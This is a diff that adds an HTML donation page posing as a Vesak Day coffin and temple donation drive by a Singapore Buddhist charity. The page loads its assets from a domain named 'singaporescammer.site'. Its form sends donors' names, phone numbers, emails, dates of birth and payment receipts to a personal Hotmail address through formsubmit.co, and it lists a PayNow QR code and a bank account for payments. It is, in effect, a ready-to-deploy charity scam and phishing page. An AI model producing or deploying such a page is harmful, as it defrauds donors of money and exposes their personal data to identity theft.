@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Vesak Day Coffin Donation Drive by Toa Payoh Seu Teck Sean Tong – Support the less fortunate with dignity and compassion." />
+  <meta name="keywords" content="Vesak Day, Coffin Donation, Buddhist Charity, Funeral Help, Seu Teck Sean Tong, Singapore Buddhist Donation" />
+  <meta name="author" content="Toa Payoh Seu Teck Sean Tong" />
+  <title>Donation Details – Vesak Day Drive</title>
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Serif&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      font-family: 'Noto Serif', serif;
+      color: #4b2e2e;
+      line-height: 1.8;
+      margin: 0;
+      padding: 0;
+      background: url('https://www.singaporescammer.site/assets/goldbackground.png') no-repeat center center;
+      background-size: cover;
+      background-attachment: scroll;
+      position: relative;
+    }
+
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(255, 255, 255, 0.3);
+      z-index: -1;
+    }
+
+    .container {
+      max-width: 800px;
+      margin: 40px auto;
+      padding: 30px 20px;
+      background-color: rgba(255, 249, 229, 0.95);
+      border: 2px solid #e5c89c;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+    }
+
+    h1 {
+      text-align: center;
+      color: #a12525;
+      font-size: 2.3em;
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 12px;
+      margin-top: 5px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      font-size: 1em;
+      box-sizing: border-box;
+      background-color: #fff;
+    }
+
+    .amount {
+      margin-top: 25px;
+      font-size: 1.2em;
+      color: #a12525;
+      text-align: center;
+      font-weight: bold;
+    }
+
+    .qr-container {
+      margin-top: 25px;
+      text-align: center;
+    }
+
+    .qr-container img {
+      max-width: 280px;
+      width: 100%;
+      height: auto;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
+
+    .payment-instructions {
+      margin-top: 15px;
+      font-size: 0.95em;
+      color: #5a3a2e;
+    }
+
+    .bank-info {
+      margin-top: 15px;
+      background: #fdf5e6;
+      padding: 15px;
+      border: 1px dashed #cc9f5d;
+      border-radius: 8px;
+      font-size: 0.95em;
+      text-align: left;
+    }
+
+    .file-upload {
+      background-color: #fefefe;
+      border: 1px solid #ccc;
+      padding: 12px;
+      margin-top: 10px;
+      border-radius: 6px;
+      font-size: 1em;
+      width: 100%;
+    }
+
+    .submit-btn {
+      background: #a12525;
+      color: #fff9e5;
+      padding: 14px;
+      margin-top: 30px;
+      border: none;
+      border-radius: 6px;
+      font-size: 1.1em;
+      cursor: pointer;
+      width: 100%;
+      transition: background 0.3s ease;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    }
+
+    .submit-btn:hover {
+      background: #801d1d;
+    }
+
+    footer {
+      text-align: center;
+      font-size: 0.9em;
+      color: #6a4e2c;
+      margin: 40px 0 10px;
+    }
+
+    @media (max-width: 480px) {
+      h1 {
+        font-size: 1.8em;
+      }
+
+      input, select, .file-upload, .submit-btn {
+        font-size: 1em;
+      }
+
+      .container {
+        padding: 24px 16px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Donation Details</h1>
+    <form action="https://formsubmit.co/endgameis21@hotmail.com" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="_next" value="https://www.singaporescammer.site/thank-you.html" />
+
+      <label for="name">Full Name</label>
+      <input type="text" name="Name" required />
+
+      <label for="contact">Contact Number</label>
+      <input type="text" name="Contact" required />
+
+      <label for="email">Email Address</label>
+      <input type="email" name="Email" required />
+
+      <label for="dob">Date of Birth</label>
+      <input type="date" name="Date of Birth" required />
+
+      <label for="donation">Select Donation Type</label>
+<select name="Donation Option" id="donation" required onchange="updateAmount()">
+  <option value="">-- Choose an Option --</option>
+  <option value="Donate Coffin">Donate Coffin – $500</option>
+  <option value="Food Hamper">Food Hamper – $58</option>
+  <option value="Temple Tiles">Temple Tiles – $38</option>
+  <option value="Monk Robe">Monk Robe – $70</option>
+  <option value="Animal Release">Animal Release – $38</option>
+  <option value="Oil Lamp">Oil Lamp – $15</option>
+  <option value="1 Solar Tile">1 Solar Tile – $180</option>
+  <option value="5 Solar Tiles">5 Solar Tiles – $800</option>
+  <option value="10+ Solar Tiles">10+ Solar Tiles – $1500+</option>
+</select>
+
+      <div class="amount" id="amountDisplay">Selected Amount: -</div>
+
+      <div class="qr-container">
+        <img src="https://www.singaporescammer.site/assets/paynowqrcode.png" alt="PayNow QR Code" />
+        <p class="payment-instructions">
+          <strong>Scan or download the QR code</strong> above to make payment via PayNow.<br />
+          Please <strong>adjust the amount</strong> according to the selected donation type.
+        </p>
+        <div class="bank-info">
+          <strong>Payee Name:</strong> Seu Teck Sean Tong<br />
+          <strong>Bank Name:</strong> DBS Bank<br />
+          <strong>Account Number:</strong> 88532600023329155
+        </div>
+      </div>
+
+      <label for="receipt">Upload Receipt</label>
+      <input type="file" name="Receipt" accept="image/*" class="file-upload" required />
+
+      <button type="submit" class="submit-btn">Confirm & Submit</button>
+    </form>
+  </div>
+
+  <footer>
+    &copy; 2025 Toa Payoh Seu Teck Sean Tong. All rights reserved.
+  </footer>
+
+  <script>
+    function updateAmount() {
+      const donation = document.getElementById("donation").value;
+      const amountDisplay = document.getElementById("amountDisplay");
+      const prices = {
+        "Donate Coffin": "$500",
+        "Food Hamper": "$58",
+        "Temple Tiles": "$38",
+        "Monk Robe": "$70",
+        "Animal Release": "$38",
+        "Oil Lamp": "$15"
+      };
+      amountDisplay.textContent = donation ? `Selected Amount: ${prices[donation]}` : "Selected Amount: -";
+    }
+  </script>
+</body>
+</html>
